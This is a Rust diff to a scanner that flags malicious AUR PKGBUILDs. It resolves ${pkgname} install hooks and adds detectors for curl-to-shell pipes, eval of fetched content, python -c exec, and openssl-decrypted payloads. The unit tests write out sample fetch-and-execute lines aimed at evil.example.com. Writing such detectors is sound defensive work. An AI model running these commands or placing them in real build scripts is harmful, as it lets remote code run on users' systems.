@@ -80,6 +80,58 @@ pub(crate) fn parse_install_filename(pkgbuild_text: &str) -> Option<String> {
     None
 }
 
+/// Same as `parse_install_filename`, but additionally resolves a
+/// `$pkgname`/`${pkgname}` or `$pkgbase`/`${pkgbase}` reference against the
+/// PKGBUILD's own declared value. Most real PKGBUILDs write
+/// `install=${pkgname}.install` rather than repeating the literal name —
+/// the plain literal parser returns that unresolved string, the fetch
+/// against it 404s, and the install hook silently never gets scanned at
+/// all. Returns `None` if the value still contains an unresolved `$` after
+/// substitution (e.g. `pkgname` declared as an array in a split package)
+/// rather than fetching a garbage filename.
+pub(crate) fn resolve_install_filename(pkgbuild_text: &str) -> Option<String> {
+    let raw = parse_install_filename(pkgbuild_text)?;
+    if !raw.contains('$') {
+        return Some(raw);
+    }
+    let pkgname = simple_var(pkgbuild_text, "pkgname");
+    let pkgbase = simple_var(pkgbuild_text, "pkgbase");
+    let resolved = raw
+        .replace("${pkgname}", pkgname.as_deref().unwrap_or("\u{0}"))
+        .replace("$pkgname", pkgname.as_deref().unwrap_or("\u{0}"))
+        .replace("${pkgbase}", pkgbase.as_deref().unwrap_or("\u{0}"))
+        .replace("$pkgbase", pkgbase.as_deref().unwrap_or("\u{0}"));
+    if resolved.contains('$') || resolved.contains('\u{0}') {
+        None
+    } else {
+        Some(resolved)
+    }
+}
+
+/// Grabs a simple scalar `key=value` assignment from a PKGBUILD (first
+/// match, comments skipped). Returns `None` for array assignments
+/// (`pkgname=(a b)`, used by split packages) since there's no single
+/// value to substitute.
+fn simple_var(source: &str, key: &str) -> Option<String> {
+    let needle = format!("{}=", key);
+    for line in source.lines() {
+        let l = line.trim();
+        if l.starts_with('#') {
+            continue;
+        }
+        if let Some(rest) = l.strip_prefix(&needle) {
+            if rest.starts_with('(') {
+                return None;
+            }
+            let v = rest.trim().trim_matches('\'').trim_matches('"');
+            if !v.is_empty() {
+                return Some(v.to_string());
+            }
+        }
+    }
+    None
+}
+
 /// `curl ... | sh` / `wget ... | bash` / `... | source` style remote-code-exec
 /// pipelines. Deliberately loose (matches curl/wget followed eventually by a
 /// pipe into a shell) since attackers vary whitespace and flags constantly.
@@ -94,10 +146,19 @@ pub(crate) fn curl_pipe_shell_line(line: &str) -> bool {
     if !has_fetcher || !lower.contains('|') {
         return false;
     }
-    let after_pipe = lower.splitn(2, '|').nth(1).unwrap_or("");
-    ["sh", "bash", "zsh", "source", "."].iter().any(|shell| {
-        after_pipe.split_whitespace().next() == Some(shell)
-    })
+    let after_pipe = lower.splitn(2, '|').nth(1).unwrap_or("").trim();
+    let mut tokens = after_pipe.split_whitespace();
+    let mut first = tokens.next().unwrap_or("");
+    // `env sh` / `env -S bash` wrapper — skip past `env` and its flags to
+    // the actual interpreter token.
+    if first == "env" {
+        first = tokens.find(|t: &&str| !t.starts_with('-')).unwrap_or("");
+    }
+    // Strip a path prefix so `/bin/sh`, `/usr/bin/bash`, `./sh` etc. match
+    // the same as a bare shell name — the old exact-match here let
+    // absolute-path shells slip straight through.
+    let basename = first.rsplit('/').next().unwrap_or(first);
+    ["sh", "bash", "zsh", "source", "."].contains(&basename)
 }
 
 #[cfg(test)]
@@ -468,6 +529,86 @@ pub(crate) fn line_of_onion_address(source: &str) -> Option<usize> {
     source.lines().position(onion_address_line).map(|i| i + 1)
 }
 
+/// `eval "$(curl ...)"` / `eval `wget -O- ...`` — a stealthier cousin of
+/// curl|sh: there's no literal pipe-into-shell to grep for, `eval` just
+/// runs the fetched text as shell code directly via command substitution.
+/// Deliberately scoped to `eval` paired with curl/wget inside a `$(...)`
+/// or backtick construct on the same line — bare `eval` alone is common
+/// and legitimate in PKGBUILDs (e.g. evaluating an array variable).
+pub(crate) fn eval_remote_exec_line(line: &str) -> bool {
+    let l = line.trim();
+    if l.starts_with('#') {
+        return false;
+    }
+    let lower = l.to_lowercase();
+    let Some(idx) = lower.find("eval") else { return false };
+    let after = &lower[idx..];
+    let has_subshell = after.contains("$(") || after.contains('`');
+    has_subshell && (after.contains("curl") || after.contains("wget"))
+}
+
+#[cfg(test)]
+pub(crate) fn is_eval_remote_exec(source: &str) -> bool {
+    source.lines().any(eval_remote_exec_line)
+}
+
+pub(crate) fn line_of_eval_remote_exec(source: &str) -> Option<usize> {
+    source.lines().position(eval_remote_exec_line).map(|i| i + 1)
+}
+
+/// `python(3) -c '...'` where the inline snippet itself execs/evals
+/// decoded content (`exec(`, `eval(`, `os.system(`, `subprocess.*`,
+/// `os.popen(`) — a python-flavored equivalent of `base64 -d | bash`,
+/// dressed up as "just calling python" to dodge the shell-specific
+/// heuristics above.
+pub(crate) fn python_inline_exec_line(line: &str) -> bool {
+    let l = line.trim();
+    if l.starts_with('#') {
+        return false;
+    }
+    let lower = l.to_lowercase();
+    let has_python_c = (lower.contains("python ") || lower.contains("python3 ") || lower.contains("python2 "))
+        && lower.contains(" -c");
+    if !has_python_c {
+        return false;
+    }
+    ["exec(", "eval(", "os.system(", "subprocess.", "os.popen("]
+        .iter()
+        .any(|p| lower.contains(p))
+}
+
+#[cfg(test)]
+pub(crate) fn is_python_inline_exec(source: &str) -> bool {
+    source.lines().any(python_inline_exec_line)
+}
+
+pub(crate) fn line_of_python_inline_exec(source: &str) -> Option<usize> {
+    source.lines().position(python_inline_exec_line).map(|i| i + 1)
+}
+
+/// `openssl enc -d` / `openssl ... -aes... -d` — decrypting a bundled blob
+/// at build time. Same obfuscation role as `base64 -d`, one step more
+/// effortful since it needs a key/passphrase baked in alongside it.
+pub(crate) fn openssl_decrypt_line(line: &str) -> bool {
+    let l = line.trim();
+    if l.starts_with('#') {
+        return false;
+    }
+    let lower = l.to_lowercase();
+    lower.contains("openssl")
+        && lower.contains(" -d")
+        && (lower.contains("enc") || lower.contains("aes") || lower.contains("des") || lower.contains("cipher"))
+}
+
+#[cfg(test)]
+pub(crate) fn is_openssl_decrypt(source: &str) -> bool {
+    source.lines().any(openssl_decrypt_line)
+}
+
+pub(crate) fn line_of_openssl_decrypt(source: &str) -> Option<usize> {
+    source.lines().position(openssl_decrypt_line).map(|i| i + 1)
+}
+
 /// How confident a finding is. `Suspicious` covers generic, crude-but-common
 /// heuristics (curl|sh, base64 -d, chmod 777, raw IP, hex-escape payload) —
 /// each a real reason to look twice but each with plausible false positives.
@@ -585,6 +726,27 @@ pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
             message: "references a .onion address — legitimate PKGBUILDs don't hardcode Tor hidden-service addresses; matches the Tor-backed second-stage delivery reused across the June 2026 and Jul/Aug 2026 AUR campaigns".to_string(),
         });
     }
+    if let Some(line) = line_of_eval_remote_exec(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "runs `eval` on a curl/wget command substitution — executes fetched remote content without a literal pipe-into-shell to grep for".to_string(),
+        });
+    }
+    if let Some(line) = line_of_python_inline_exec(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "python -c snippet execs/evals content inline — a python-flavored obfuscated-execution pattern".to_string(),
+        });
+    }
+    if let Some(line) = line_of_openssl_decrypt(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "decrypts a bundled blob with openssl (possible obfuscated payload, same role as base64 -d)".to_string(),
+        });
+    }
     findings
 }
 
@@ -611,7 +773,7 @@ pub(crate) fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) {
             .map(|f| ("PKGBUILD".to_string(), f))
             .collect();
 
-        if let Some(install_name) = parse_install_filename(&pkgbuild_src) {
+        if let Some(install_name) = resolve_install_filename(&pkgbuild_src) {
             if let Some(install_src) = fetch_aur_file(pkg, &install_name) {
                 pkg_findings.extend(
                     scan_pkgbuild_source(&install_src)
@@ -1097,5 +1259,105 @@ build() {
         let findings = scan_pkgbuild_source(pkgbuild);
         assert!(findings.iter().any(|f| f.severity == Severity::Suspicious
             && f.message.contains("sudo/pkexec/doas")));
+    }
+
+    // ── absolute-path / env-wrapped shell in curl|sh (gap fix) ──────────
+
+    #[test]
+    fn curl_pipe_absolute_path_shell_detected() {
+        assert!(is_curl_pipe_shell("wget -O- https://evil.example.com/x | /bin/sh"));
+        assert!(is_curl_pipe_shell("curl -sL https://evil.example.com/x | /usr/bin/bash"));
+        assert!(is_curl_pipe_shell("wget -qO- https://evil.example.com/x | env bash"));
+        assert!(is_curl_pipe_shell("curl -sL https://evil.example.com/x | env -S sh"));
+        // still shouldn't false-positive on a plain download-to-file
+        assert!(!is_curl_pipe_shell("curl -sSL https://example.com/x -o /usr/bin/foo"));
+    }
+
+    // ── eval $(curl ...) ──────────────────────────────────────────────
+
+    #[test]
+    fn eval_remote_exec_detected() {
+        assert!(is_eval_remote_exec(r#"eval "$(curl -sSL https://evil.example.com/x)""#));
+        assert!(is_eval_remote_exec("eval `wget -qO- https://evil.example.com/x`"));
+        // bare eval on a local variable/array must not flag
+        assert!(!is_eval_remote_exec("eval \"${some_array[@]}\""));
+        assert!(!is_eval_remote_exec("# eval \"$(curl https://evil.example.com/x)\" (comment)"));
+    }
+
+    // ── python -c exec/eval + openssl decrypt ────────────────────────────
+
+    #[test]
+    fn python_inline_exec_detected() {
+        assert!(is_python_inline_exec(
+            "python3 -c \"import base64,os; exec(base64.b64decode(os.environ['P']))\""
+        ));
+        assert!(is_python_inline_exec("python -c 'os.system(\"id\")'"));
+        // python -c doing something benign shouldn't flag
+        assert!(!is_python_inline_exec("python3 -c 'print(1+1)'"));
+        assert!(!is_python_inline_exec("python3 setup.py build"));
+    }
+
+    #[test]
+    fn openssl_decrypt_detected() {
+        assert!(is_openssl_decrypt("openssl enc -d -aes-256-cbc -in payload.enc -k \"$KEY\" | sh"));
+        assert!(is_openssl_decrypt("openssl aes-256-cbc -d -in blob -out out"));
+        // encrypting (not decrypting) or unrelated openssl calls shouldn't flag
+        assert!(!is_openssl_decrypt("openssl enc -aes-256-cbc -in payload -out payload.enc"));
+        assert!(!is_openssl_decrypt("openssl dgst -sha256 foo.tar.gz"));
+    }
+
+    // ── install=${pkgname}.install resolution ────────────────────────────
+
+    #[test]
+    fn resolve_install_filename_interpolated() {
+        let src = "pkgname=foo\ninstall=${pkgname}.install\npkgver=1.0\n";
+        assert_eq!(resolve_install_filename(src), Some("foo.install".to_string()));
+
+        let src2 = "pkgname=bar\ninstall=$pkgname.install\npkgver=1.0\n";
+        assert_eq!(resolve_install_filename(src2), Some("bar.install".to_string()));
+    }
+
+    #[test]
+    fn resolve_install_filename_literal_unchanged() {
+        let src = "pkgname=foo\ninstall=custom-hook.install\n";
+        assert_eq!(resolve_install_filename(src), Some("custom-hook.install".to_string()));
+    }
+
+    #[test]
+    fn resolve_install_filename_pkgbase_split_package() {
+        let src = "pkgbase=mysuite\npkgname=(mysuite-a mysuite-b)\ninstall=${pkgbase}.install\n";
+        assert_eq!(resolve_install_filename(src), Some("mysuite.install".to_string()));
+    }
+
+    #[test]
+    fn resolve_install_filename_unresolvable_bails() {
+        // pkgname is an array (split package) and install= references it —
+        // no single value to substitute, must return None rather than a
+        // garbage filename that would 404 anyway.
+        let src = "pkgname=(a b)\ninstall=${pkgname}.install\n";
+        assert_eq!(resolve_install_filename(src), None);
+    }
+
+    #[test]
+    fn atomic_arch_style_pkgbuild_with_interpolated_install_still_caught() {
+        // Same shape as atomic_arch_style_pkgbuild_and_install_flagged above,
+        // but with the realistic ${pkgname}.install form instead of the
+        // literal name — this is the case that used to silently skip the
+        // install hook entirely.
+        let pkgbuild = r#"
+pkgname=totally-legit-tool
+pkgver=1.2.3
+pkgrel=1
+install=${pkgname}.install
+source=("https://github.com/foo/totally-legit-tool/archive/v$pkgver.tar.gz")
+build() {
+  cd "$pkgname-$pkgver"
+  make
+}
+"#;
+        assert_eq!(
+            resolve_install_filename(pkgbuild),
+            Some("totally-legit-tool.install".to_string())
+        );
     }
 }
